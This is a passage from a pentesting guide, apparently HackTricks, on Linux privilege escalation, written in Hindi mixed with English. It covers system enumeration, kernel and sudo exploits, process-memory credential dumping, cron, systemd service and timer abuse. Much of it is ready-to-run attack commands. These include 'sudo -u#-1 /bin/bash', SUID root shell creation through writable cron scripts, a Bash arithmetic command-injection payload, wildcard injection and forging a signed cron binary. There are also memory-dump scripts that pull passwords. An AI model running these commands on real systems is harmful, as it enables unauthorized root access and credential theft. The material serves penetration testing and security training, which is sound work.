# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## सिस्टम जानकारी

### OS जानकारी

आइए चल रहे OS के बारे में कुछ जानकारी प्राप्त करना शुरू करें
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

यदि आपके पास **`PATH` वेरिएबल के किसी भी फ़ोल्डर पर write permissions** हैं तो आप कुछ libraries या binaries को hijack कर सकते हैं:
```bash
echo $PATH
```
### Env जानकारी

क्या environment variables में दिलचस्प जानकारी, passwords या API keys हैं?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

kernel version जाँच करें और देखें कि कोई exploit है जिसका उपयोग करके escalate privileges किया जा सके।
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
आप एक अच्छी vulnerable kernel list और कुछ पहले से **compiled exploits** यहाँ पा सकते हैं: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
अन्य साइटें जहाँ आप कुछ **compiled exploits** पा सकते हैं: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

उस वेबसाइट से सभी vulnerable kernel versions निकालने के लिए आप यह कर सकते हैं:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
kernel exploits खोजने में मदद करने वाले उपकरण:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim, केवल kernel 2.x के लिए exploits ही चेक करता है)

Always **search the kernel version in Google**, शायद आपका kernel version किसी kernel exploit में लिखा हो और तब आप सुनिश्चित हो सकते हैं कि यह exploit वैध है।

अतिरिक्त kernel exploitation techniques:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo संस्करण

निम्न कमजोर sudo संस्करणों के आधार पर:
```bash
searchsploit sudo
```
आप इस grep का उपयोग करके यह जांच सकते हैं कि sudo का संस्करण vulnerable है या नहीं।
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Sudo के 1.9.17p1 से पहले के संस्करण (**1.9.14 - 1.9.17 < 1.9.17p1**) कम-विशेषाधिकार वाले स्थानीय उपयोगकर्ताओं को उस समय root तक अपनी विशेषाधिकार बढ़ाने की अनुमति देते हैं जब वे sudo `--chroot` विकल्प का उपयोग करें और `/etc/nsswitch.conf` फ़ाइल उपयोगकर्ता-नियंत्रित डायरेक्टरी से ली जा रही हो।

Here is a [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) to exploit that [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Before running the exploit, make sure that your `sudo` version is vulnerable and that it supports the `chroot` feature.

For more information, refer to the original [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

स्रोत: @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg सिग्नेचर सत्यापन विफल

देखें **smasher2 box of HTB** इस बात का **उदाहरण** कि इस vuln का दुरुपयोग कैसे किया जा सकता है
```bash
dmesg 2>/dev/null | grep "signature"
```
### और अधिक सिस्टम enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## संभावित रक्षा उपाय सूचीबद्ध करें

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

यदि आप किसी docker container के अंदर हैं, तो आप उससे बाहर निकलने की कोशिश कर सकते हैं:


{{#ref}}
docker-security/
{{#endref}}

## Drives

जाँचें **क्या माउंटेड और अनमाउंटेड है**, कहाँ और क्यों। अगर कुछ अनमाउंटेड है तो आप उसे माउंट करके निजी जानकारी के लिए जाँच कर सकते हैं
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## उपयोगी सॉफ़्टवेयर

उपयोगी binaries की सूची बनाएं
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
इसके अलावा, जांचें कि **कोई compiler इंस्टॉल है या नहीं**। यह उपयोगी है अगर आपको किसी kernel exploit का उपयोग करना हो क्योंकि अनुशंसा की जाती है कि उसे उसी मशीन में compile किया जाए जहाँ आप उसे उपयोग करने वाले हैं (या किसी समान मशीन में)।
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### स्थापित कमजोर सॉफ़्टवेयर

जाँच करें कि **इंस्टॉल किए गए पैकेज और सेवाओं का संस्करण** क्या है। शायद कोई पुराना Nagios संस्करण (उदाहरण के लिए) हो सकता है जो could be exploited for escalating privileges…\  
यह सिफारिश की जाती है कि आप अधिक संदिग्ध इंस्टॉल किए गए सॉफ़्टवेयर के संस्करण को मैन्युअल रूप से जाँचें।
```bash
dpkg -l #Debian
rpm -qa #Centos
```
यदि आपके पास मशीन तक SSH access है, तो आप मशीन के भीतर इंस्टॉल किए गए पुराने और vulnerable सॉफ़्टवेयर की जांच करने के लिए **openVAS** का उपयोग कर सकते हैं।

> [!NOTE] > _ध्यान दें कि ये commands बहुत सारी जानकारी दिखाएँगे जो ज्यादातर बेकार होगी, इसलिए OpenVAS जैसी कुछ applications या समान टूल की सलाह दी जाती है जो यह जाँचें कि कोई इंस्टॉल किए गए सॉफ़्टवेयर वर्शन known exploits के लिए vulnerable है या नहीं_

## प्रक्रियाएँ

देखें कि **कौन से processes** चल रहे हैं और जांचें कि किसी process के पास **अपनी आवश्यकता से अधिक privileges** तो नहीं हैं (शायद कोई tomcat root द्वारा चल रहा है?)
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
Also **check your privileges over the processes binaries**, maybe you can overwrite someone.

### प्रोसेस मॉनिटरिंग

You can use tools like [**pspy**](https://github.com/DominicBreuker/pspy) to monitor processes. यह उन vulnerable processes को पहचानने में बहुत उपयोगी हो सकता है जो अक्सर चलाये जाते हैं या जब कुछ शर्तें पूरी होती हैं।

### Process memory

कुछ सर्विसेज सर्वर की मेमोरी के अंदर **credentials in clear text inside the memory** सेव कर देती हैं।\
सामान्यतः आपको दूसरों के processes की मेमोरी पढ़ने के लिए **root privileges** चाहिए होते हैं, इसलिए यह आमतौर पर तब ज्यादा उपयोगी होता है जब आप पहले से root होते हैं और और भी credentials खोजना चाहते हैं।\
हालाँकि, याद रखें कि सामान्य उपयोगकर्ता के रूप में आप उन processes की मेमोरी पढ़ सकते हैं जो आपके OWN हैं।

> [!WARNING]
> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: सभी processes को debug किया जा सकता है, बशर्ते उनका वही uid हो। यह ptracing के पारंपरिक तरीके जैसा है।
> - **kernel.yama.ptrace_scope = 1**: केवल parent process को ही debug किया जा सकता है।
> - **kernel.yama.ptrace_scope = 2**: केवल admin ptrace का उपयोग कर सकता है, क्योंकि इसके लिए CAP_SYS_PTRACE capability की आवश्यकता होती है।
> - **kernel.yama.ptrace_scope = 3**: किसी भी process को ptrace से traced नहीं किया जा सकता। एक बार सेट हो जाने पर ptracing को फिर से सक्षम करने के लिए reboot की आवश्यकता होती है।

#### GDB

If you have access to the memory of an FTP service (for example) you could get the Heap and search inside of its credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB स्क्रिप्ट
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

किसी दिए गए process ID के लिए, **maps दिखाता है कि मेमोरी उस process के virtual address space में कैसे मैप की गई है**; यह प्रत्येक मैप किए गए क्षेत्र की **अनुमतियाँ** भी दिखाता है। **mem** pseudo file **प्रोसेस की मेमोरी को स्वयं उजागर करता है**। **maps** फ़ाइल से हमें पता चलता है कि कौन से **मेमोरी क्षेत्र पढ़ने योग्य हैं** और उनके offsets क्या हैं। हम इस जानकारी का उपयोग करके **mem फ़ाइल में seek करके और सभी पढ़ने योग्य क्षेत्रों को dump करके** उन्हें एक फ़ाइल में निकालते हैं।
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` सिस्टम की **भौतिक** मेमोरी तक पहुँच प्रदान करता है, न कि आभासी मेमोरी तक। कर्नेल के आभासी एड्रेस स्पेस तक /dev/kmem के माध्यम से पहुँच की जा सकती है.\
आम तौर पर, `/dev/mem` केवल **root** और **kmem** समूह द्वारा पढ़ने योग्य होता है।
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump Windows के लिए Sysinternals suite के क्लासिक ProcDump tool की Linux के लिए पुनर्कल्पना है। इसे यहाँ पाएं: [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### उपकरण

किसी process की memory को dump करने के लिए आप इनका उपयोग कर सकते हैं:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_आप मैन्युअल रूप से root आवश्यकताओं को हटाकर उस process को dump कर सकते हैं जो आपका है
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root आवश्यक है)

### Process Memory से Credentials

#### मैन्युअल उदाहरण

यदि आप पाते हैं कि authenticator process चल रहा है:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
आप process को dump कर सकते हैं (पहले के अनुभाग देखें जहाँ process की memory dump करने के विभिन्न तरीके बताए गए हैं) और memory के अंदर credentials के लिए खोज करें:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

यह टूल [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) मेमोरी से **clear text credentials** और कुछ **well known files** से चुराएगा। इसे ठीक से चलाने के लिए root privileges की आवश्यकता होती है।

| विशेषता                                          | प्रोसेस नाम           |
| ------------------------------------------------- | -------------------- |
| GDM पासवर्ड (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (सक्रिय FTP कनेक्शन)                      | vsftpd               |
| Apache2 (सक्रिय HTTP Basic Auth सत्र)            | apache2              |
| OpenSSH (सक्रिय SSH सत्र - Sudo उपयोग)           | sshd:                |

#### खोज Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## निर्धारित/Cron jobs

### Crontab UI (alseambusher) running as root – वेब-आधारित शेड्यूलर privesc

अगर एक वेब “Crontab UI” पैनल (alseambusher/crontab-ui) root के रूप में चल रहा है और केवल loopback से बाइंड है, तो आप इसे SSH local port-forwarding के जरिए एक्सेस कर सकते हैं और एक privileged job बना कर प्रिविलेज बढ़ा सकते हैं।

Typical chain
- Discover loopback-only port (e.g., 127.0.0.1:8000) and Basic-Auth realm via `ss -ntlp` / `curl -v localhost:8000`
- Find credentials in operational artifacts:
- Backups/scripts with `zip -P <password>`
- systemd unit exposing `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- टनेल बनाकर लॉगिन:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- एक high-priv job बनाएँ और तुरंत चलाएँ (drops SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- इसे इस्तेमाल करें:
```bash
/tmp/rootshell -p   # root shell
```
Hardening
- Crontab UI को root के रूप में न चलाएँ; इसे एक समर्पित उपयोगकर्ता और न्यूनतम अनुमतियों के साथ सीमित करें
- localhost पर बाइंड करें और अतिरिक्त रूप से firewall/VPN के माध्यम से एक्सेस सीमित करें; पासवर्ड पुन: उपयोग न करें
- unit files में secrets एम्बेड करने से बचें; secret stores या केवल root-के‑लिए EnvironmentFile का उपयोग करें
- ऑन-डिमांड जॉब निष्पादन के लिए audit/logging सक्षम करें



जाँच करें कि कोई scheduled job vulnerable तो नहीं। शायद आप root द्वारा निष्पादित हो रहे किसी script का फायदा उठा सकें (wildcard vuln? क्या आप उन फाइलों को संशोधित कर सकते हैं जिन्हें root उपयोग करता है? symlinks का उपयोग करें? उस directory में specific files बनाएं जिन्हें root उपयोग करता है?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

उदाहरण के लिए, _/etc/crontab_ के अंदर आप PATH पा सकते हैं: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_ध्यान दें कि user के पास /home/user पर लिखने की अनुमतियाँ हैं_)

यदि इस crontab के अंदर root उपयोगकर्ता PATH सेट किए बिना कोई command या script चलाने की कोशिश करता है। उदाहरण के लिए: _\* \* \* \* root overwrite.sh_\
फिर, आप root shell प्राप्त कर सकते हैं:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron using a script with a wildcard (Wildcard Injection)

यदि कोई स्क्रिप्ट root द्वारा execute की जा रही हो और किसी command में “**\***” मौजूद हो, तो आप इसका exploit करके अनपेक्षित चीज़ें (जैसे privesc) कर सकते हैं। उदाहरण:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**यदि wildcard किसी path जैसे** _**/some/path/\***_ **के आगे आता है, तो यह vulnerable नहीं है (यहाँ तक कि** _**./\***_ **भी नहीं)।**

Read the following page for more wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash performs parameter expansion and command substitution before arithmetic evaluation in ((...)), $((...)) and let. If a root cron/parser reads untrusted log fields and feeds them into an arithmetic context, an attacker can inject a command substitution $(...) that executes as root when the cron runs.

- Why it works: Bash में expansions इस क्रम में होते हैं: parameter/variable expansion, command substitution, arithmetic expansion, और फिर word splitting और pathname expansion. इसलिए एक value जैसे `$(/bin/bash -c 'id > /tmp/pwn')0` पहले substitute होता है (command चलाकर), और बाकी numeric `0` arithmetic के लिए उपयोग होता है ताकि script बिना त्रुटि के जारी रहे।

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: parsed log में attacker-controlled text लिखवाएँ ताकि numeric-looking field में एक command substitution हो और वह digit पर खत्म हो। सुनिश्चित करें कि आपका command stdout पर कुछ print न करे (या उसे redirect करें) ताकि arithmetic वैध रहे।
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

If you **can modify a cron script** executed by root, you can get a shell very easily:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
अगर root द्वारा चलाया गया script किसी ऐसे **directory जहाँ आपकी पूर्ण पहुँच हो** का उपयोग करता है, तो उस फ़ोल्डर को हटाकर और किसी दूसरे फ़ोल्डर की ओर एक **symlink folder** बनाना उपयोगी हो सकता है, जो आपके नियंत्रित script को चलाए।
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Custom-signed cron बाइनरी जिनमें writable payloads हों
Blue teams कभी-कभी cron-चालित बाइनरी को "sign" करते हैं — एक custom ELF सेक्शन dump करके और vendor string के लिए grep करके — और फिर उन्हें root के रूप में execute करते हैं। अगर वह बाइनरी group-writable है (उदा., `/opt/AV/periodic-checks/monitor` जिसका मालिक `root:devs 770` है) और आप signing material को leak कर सकते हैं, तो आप उस सेक्शन को forge करके cron task hijack कर सकते हैं:

1. verification flow capture करने के लिए `pspy` का उपयोग करें। In Era, root ने `objcopy --dump-section .text_sig=text_sig_section.bin monitor` चलाया, उसके बाद `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` चलाया और फिर फाइल को execute किया।
2. leaked key/config (from `signing.zip`) का उपयोग करके अपेक्षित certificate पुनः बनाएं:
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. एक malicious replacement बनाएं (उदा., SUID bash डालें, अपना SSH key जोड़ें) और certificate को `.text_sig` में embed करें ताकि grep पास हो:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. execute bits बनाए रखते हुए scheduled binary को overwrite करें:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. अगले cron run का इंतज़ार करें; एक बार naive signature check सफल हो जाने पर, आपका payload root के रूप में चलेगा।

### Frequent cron jobs

आप processes को मॉनिटर करके उन processes की खोज कर सकते हैं जो हर 1, 2 या 5 मिनट में execute हो रही हों। शायद आप इसका फायदा उठाकर privileges escalate कर सकें।

For example, to **monitor every 0.1s during 1 minute**, **sort by less executed commands** and delete the commands that have been executed the most, you can do:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**आप इसका भी उपयोग कर सकते हैं** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (यह शुरू होने वाली हर process को मॉनिटर और सूचीबद्ध करेगा).

### अदृश्य cron jobs

यह संभव है कि एक cronjob बनाया जा सके **comment के बाद carriage return डालकर** (बिना newline character), और cron job काम करेगा। उदाहरण (ध्यान दें carriage return char):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Services

### Writable _.service_ files

जाँचें कि क्या आप किसी `.service` फ़ाइल को लिख सकते हैं, अगर कर सकते हैं तो आप **इसे संशोधित कर सकते हैं** ताकि यह आपका **backdoor को निष्पादित करे जब** सेवा **शुरू**, **पुनः आरंभ** या **बंद** की जाए (शायद आपको मशीन के रीबूट होने तक इंतज़ार करना पड़े).\
उदाहरण के लिए अपनी backdoor को .service फ़ाइल के अंदर बनाएं और **`ExecStart=/tmp/script.sh`** सेट करें

### Writable service binaries

ध्यान रखें कि यदि आपके पास **सेवाओं द्वारा निष्पादित बाइनरीज़ पर लिखने की अनुमति** है, तो आप उन्हें backdoors के लिए बदल सकते हैं ताकि जब सेवाएँ फिर से निष्पादित हों तो backdoors भी निष्पादित हो जाएँ।

### systemd PATH - Relative Paths

आप **systemd** द्वारा उपयोग किए गए PATH को निम्न से देख सकते हैं:
```bash
systemctl show-environment
```
यदि आप पाते हैं कि आप path के किसी भी फ़ोल्डर में **write** कर सकते हैं तो आप **escalate privileges** करने में सक्षम हो सकते हैं। आपको ऐसी फ़ाइलों में **relative paths being used on service configurations** की खोज करनी चाहिए, जैसे:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
फिर, उस systemd PATH फ़ोल्डर के अंदर जहाँ आप लिख सकते हैं, एक **executable** बनाएं जिसका नाम **same name as the relative path binary** हो, और जब service से कमजोर कार्रवाई (**Start**, **Stop**, **Reload**) को चलाने के लिए कहा जाएगा, आपका **backdoor will be executed** (अनप्रिविलेज्ड उपयोगकर्ता आमतौर पर services को start/stop नहीं कर पाते — पर देखें कि क्या आप `sudo -l` का उपयोग कर सकते हैं)।

**services के बारे में और जानने के लिए `man systemd.service` देखें।**

## **टाइमर**

**टाइमर** systemd unit फ़ाइलें हैं जिनके नाम `**.timer**` पर समाप्त होते हैं और जो `**.service**` फ़ाइलों या इवेंट्स को नियंत्रित करते हैं। **टाइमर** को cron के विकल्प के रूप में उपयोग किया जा सकता है क्योंकि इनमें कैलेंडर समय इवेंट्स और मोनोटोनीक समय इवेंट्स के लिए built-in सपोर्ट होता है और इन्हें asynchronously चलाया जा सकता है।

आप सभी टाइमर को सूचीबद्ध कर सकते हैं:
```bash
systemctl list-timers --all
```
### लिखने योग्य टाइमर

यदि आप किसी टाइमर को संशोधित कर सकते हैं तो आप इसे systemd.unit की कुछ मौजूदा इकाइयों (जैसे `.service` या `.target`) को निष्पादित करने के लिए बना सकते हैं।
```bash
Unit=backdoor.service
```
डॉक्यूमेंटेशन में आप पढ़ सकते हैं कि Unit क्या है:

> जब यह timer समाप्त होता है तो सक्रिय करने के लिए unit। तर्क एक unit नाम है, जिसका suffix ".timer" नहीं है। यदि निर्दिष्ट नहीं किया गया है, तो यह मान डिफ़ॉल्ट रूप से उस service पर सेट होता है जिसका नाम timer unit के समान होता है, सिवाय suffix के। (ऊपर देखें.) यह अनुशंसित है कि सक्रिय किए जाने वाले unit का नाम और timer unit का नाम suffix को छोड़कर एक समान हों।

इसलिए, इस permission का दुरुपयोग करने के लिए आपको निम्न करना होगा:

- कोई ऐसा systemd unit (जैसे कि `.service`) ढूंढें जो **एक writable binary execute कर रहा हो**
- कोई ऐसा systemd unit ढूंढें जो **relative path execute कर रहा हो** और आपके पास उस **systemd PATH** पर **writable privileges** हों (ताकि आप उस executable का impersonate कर सकें)

**timers के बारे में और जानने के लिए `man systemd.timer` देखें।**

### **Timer सक्षम करना**

Timer को सक्षम करने के लिए आपको root privileges चाहिए और निम्न चलाना होगा:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) क्लाइंट-सर्वर मॉडल में एक ही या अलग मशीनों पर **प्रक्रिया-संचार** को सक्षम करते हैं। वे कंप्यूटरों के बीच संचार के लिए मानक Unix descriptor फ़ाइलों का उपयोग करते हैं और `.socket` फ़ाइलों के माध्यम से सेटअप होते हैं।

Sockets को `.socket` फ़ाइलों का उपयोग करके कॉन्फ़िगर किया जा सकता है।

**`man systemd.socket` से sockets के बारे में और जानें।** इस फ़ाइल के अंदर कई दिलचस्प पैरामीटर कॉन्फ़िगर किए जा सकते हैं:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: ये विकल्प अलग हैं पर सारांश के रूप में उपयोग होते हैं ताकि **बताया जा सके कि यह socket कहाँ सुनने वाला है** (AF_UNIX socket फ़ाइल का path, IPv4/6 और/या सुनने के लिए port नंबर, आदि)।
- `Accept`: boolean argument लेता है। अगर **true** है, तो **प्रत्येक आने वाले कनेक्शन के लिए एक service instance spawn** होता है और केवल कनेक्शन socket ही उसे पास किया जाता है। अगर **false** है, तो सभी listening sockets स्वयं **started service unit को पास** किए जाते हैं, और सभी कनेक्शनों के लिए केवल एक service unit spawn होती है। यह मान datagram sockets और FIFOs के लिए नज़रअंदाज़ किया जाता है जहाँ एकल service unit अनिवार्य रूप से सभी आने वाले ट्रैफ़िक को संभालता है। **Defaults to false**। प्रदर्शन कारणों से, नए daemons को केवल `Accept=no` के अनुकूल तरीके से लिखना अनुशंसित है।
- `ExecStartPre`, `ExecStartPost`: एक या अधिक कमांड लाइनों को लेते हैं, जो listening **sockets**/FIFOs के **created** और bound होने से पहले या बाद में क्रमशः **executed** होते हैं। कमांड लाइन का पहला token एक absolute filename होना चाहिए, फिर प्रक्रिया के लिए arguments।
- `ExecStopPre`, `ExecStopPost`: अतिरिक्त **commands** जो listening **sockets**/FIFOs के **closed** और हटाए जाने से पहले या बाद में क्रमशः **executed** होते हैं।
- `Service`: incoming traffic पर सक्रिय करने के लिए उस **service** unit का नाम निर्दिष्ट करता है। यह सेटिंग केवल Accept=no वाले sockets के लिए अनुमति है। यह डिफ़ॉल्ट रूप से उस service पर सेट होता है जिसका नाम socket जैसा ही होता है (suffix बदला गया)। अधिकांश मामलों में इस विकल्प का उपयोग आवश्यक नहीं होना चाहिए।

### Writable .socket files

